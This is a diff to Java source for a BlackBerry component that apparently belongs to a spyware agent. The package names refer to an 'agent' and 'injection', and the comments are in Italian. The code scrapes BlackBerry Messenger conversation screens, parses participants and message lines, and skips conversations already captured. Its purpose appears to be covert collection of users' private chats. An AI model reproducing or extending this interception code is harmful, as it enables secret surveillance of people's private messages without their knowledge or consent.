@@ -1,5 +1,6 @@
 package blackberry.agent.im;
 
+import java.util.Hashtable;
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
@@ -11,13 +12,13 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.MenuWalker;
 import blackberry.utils.Check;
-import blackberry.utils.Utils;
 
 public class ConversationScreen {
     private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE);
 
     private UiApplication bbmApplication;
     private Vector conversationScreens = new Vector();
+    Hashtable conversations=new Hashtable();
 
     public void setBBM(UiApplication bbmApplication) {
         this.bbmApplication = bbmApplication;
@@ -41,13 +42,24 @@ public class ConversationScreen {
                     && bbmApplication.isForeground()) {
 
                 String conversation = extractConversation(screen);
-
+                
+                
                 if (!conversationScreens.contains(screen)) {
                     debug.info("Added new conversation screen: " + screen);
                     conversationScreens.addElement(screen);
+                    conversations.put(screen, new Integer(conversation.hashCode()));
                     // exploreField(screen, 0, new String[0]);
                 }
 
+                // se conversation e' uguale all'ultima parsata non fare niente.
+                Integer hash = (Integer) conversations.get(screen);
+                if(hash.intValue() == conversation.hashCode()){
+                    //#ifdef DEBUG
+                    debug.trace("getConversationScreen: equal conversation, ignore it");
+                    //#endif
+                    return;
+                }
+                
                 Vector result = parseConversation(conversation);
 
                 if (result != null) {
@@ -116,27 +128,14 @@ public class ConversationScreen {
             int pos = conversation.indexOf("-------------");
             String partecipants;
             //String partecipant1, partecipant2;
+
             int partStart = conversation.indexOf("\n", pos) + 1;
             int partSep = conversation.indexOf(", ", partStart);
             int partEnd = conversation.indexOf("\n", partSep);
 
-            partecipants = conversation.substring(partStart, partEnd);
+            partecipants = conversation.substring(partStart, partEnd).trim();
 
-            Vector users = Utils.Tokenize(partecipants, ", ");
-            if(users.size()<2){
-                //#ifdef DEBUG
-                debug.error("parseConversation: error partecipants");
-                //#endif
-                
-                return null;
-            }
-            
             Vector result = new Vector();
-
-            //partecipant1 = conversation.substring(posStart, posSep);
-            //debug.trace("partecipant 1: " + partecipant1);
-            //partecipant2 = conversation.substring(posSep + 2, posEnd);
-            //debug.trace("partecipant 2: " + partecipant2);
 
             int posMessages = getLinePos(conversation, 6);
             int numLine = 1;
@@ -150,42 +149,27 @@ public class ConversationScreen {
                     break;
                 }
                 posMessages += currentLine.length() + 1;
-
-                partSep = currentLine.indexOf(":");
-                if (partSep == -1) {
-                    lastLine = currentLine;
-                    continue;
-                } else {
-                    currentLine = lastLine +" "+ currentLine;
-                    partSep += lastLine.length()+1;
-                    lastLine = "";
-                }
-                String userFull = currentLine.substring(0, partSep).trim();
-                
-                String message = currentLine.substring(partSep + 2).trim();
-
-                String user = Utils.firstWord(userFull);
-                if(!users.contains(user)){
-                    user = userFull;
-                }else{
-                    //#ifdef DEBUG
-                    debug.trace("parseConversation, user found: "+user);
-                    //#endif
-                }
                 
                 if (numLine < 5) {
                     //#ifdef DEBUG
-                    debug.trace("line " + numLine + " user: " + user
-                            + " message: " + message);
+                    debug.trace("line " + numLine + " : " + currentLine);
                     //#endif
                 }
                 numLine += 1;
 
-                Line line = new Line(user, message);
+                // unisce le linee spezzate del nome
+                if(currentLine.indexOf(":")<0){
+                    lastLine=currentLine;
+                    continue;
+                }else{
+                    currentLine = lastLine+" "+currentLine;
+                    lastLine="";
+                }
+                
                 //#ifdef DEBUG
-                debug.trace("parseConversation adding line: " + line);
+                debug.trace("parseConversation adding line: " + currentLine);
                 //#endif
-                lines.addElement(line);
+                lines.addElement(currentLine.trim());
             }
 
             //agent.add(partecipants, lines);
